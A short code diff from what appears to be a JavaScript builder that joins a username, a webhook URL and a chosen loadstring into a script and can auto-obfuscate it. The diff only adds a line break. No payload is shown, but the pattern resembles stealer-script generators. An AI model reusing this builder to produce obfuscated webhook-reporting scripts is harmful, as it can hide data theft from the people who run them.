@@ -99,7 +99,8 @@
         }
 
         let script = `Username = "${username}"
-Webhook = "${webhook}" ${loadstrings[selectedScript]}`;
+Webhook = "${webhook}" 
+${loadstrings[selectedScript]}`;
 
 if (autoObfuscate) {
             script = obfuscateScript(script);
